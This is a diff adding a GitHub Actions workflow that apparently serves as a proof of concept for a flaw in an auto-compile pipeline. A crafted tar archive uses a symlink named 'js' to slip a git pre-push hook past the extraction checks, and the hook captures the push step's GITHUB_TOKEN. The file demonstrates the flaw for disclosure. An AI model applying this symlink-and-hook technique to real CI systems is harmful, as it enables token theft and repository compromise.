@@ -1,0 +1,112 @@
+name: autocompile-hook-poc
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  # Stands in for auto-compile.yml's `compile` job: it runs the build of the
+  # pull request (npm ci / npm run build), i.e. code the pull request's
+  # dependency tree controls, and it has no secrets.
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft the archive the build job would produce
+        run: |
+          python3 - <<'PY'
+          import io, tarfile
+
+          hook = b'''#!/bin/sh
+          printf '%s' "$TOKEN" > /tmp/leak.txt
+          echo "pre-push hook executed inside the token-bearing step"
+          exit 0
+          '''
+
+          with tarfile.open('js.tar', 'w') as archive:
+              # A symlink literally called `js`, pointing at the extraction root.
+              link = tarfile.TarInfo('js')
+              link.type = tarfile.SYMTYPE
+              link.linkname = '.'
+              link.mode = 0o777
+              archive.addfile(link)
+              # ...and a regular file below it, which is written *through* the link.
+              member = tarfile.TarInfo('js/.git/hooks/pre-push')
+              member.size = len(hook)
+              member.mode = 0o755
+              archive.addfile(member, io.BytesIO(hook))
+          PY
+      - name: Upload the assets
+        uses: actions/upload-artifact@v7
+        with:
+          name: compiled-assets
+          path: js.tar
+          if-no-files-found: error
+
+  # Mirror of auto-compile.yml's `push` job.
+  push:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+          fetch-depth: 0
+
+      - name: Download the assets
+        uses: actions/download-artifact@v8
+        with:
+          name: compiled-assets
+
+      - name: Unpack the assets
+        run: |
+          python3 - <<'PY'
+          import shutil
+          import sys
+          import tarfile
+
+          with tarfile.open('js.tar') as archive:
+              for member in archive.getmembers():
+                  parts = member.name.split('/')
+                  if parts[0] != 'js' or '..' in parts or member.name.startswith('/'):
+                      sys.exit(f'refusing {member.name!r}: outside js/')
+                  if not (member.isfile() or member.isdir() or member.issym()):
+                      sys.exit(f'refusing {member.name!r}: unsupported type')
+                  if member.issym() and (member.linkname.startswith('/') or '..' in member.linkname.split('/')):
+                      sys.exit(f'refusing {member.name!r}: links out of js/')
+              shutil.rmtree('js', ignore_errors=True)
+              archive.extractall('.', filter='data')
+          PY
+          rm js.tar
+
+      - name: Show what the validation accepted
+        run: |
+          echo "js is a symlink: $(test -L js && echo yes)"
+          ls -la .git/hooks/pre-push
+
+      - name: Commit the assets
+        run: |
+          git config user.email 'poc@example.com'
+          git config user.name 'poc'
+          git add --all -- js
+          git commit --signoff -m 'chore(assets): Recompile assets'
+
+      - name: Push
+        env:
+          HEAD_REF: poc-hook-target
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: git push "https://x-access-token:$TOKEN@github.com/$GITHUB_REPOSITORY.git" "HEAD:refs/heads/$HEAD_REF"
+
+      - name: Compare what the hook captured with the token of the push step
+        if: always()
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          if [ -f /tmp/leak.txt ]; then
+            echo "hook captured $(wc -c < /tmp/leak.txt) bytes"
+            echo "captured sha256: $(sha256sum < /tmp/leak.txt)"
+            echo "step     sha256: $(printf '%s' "$TOKEN" | sha256sum)"
+          else
+            echo "pre-push hook did not run"
+          fi
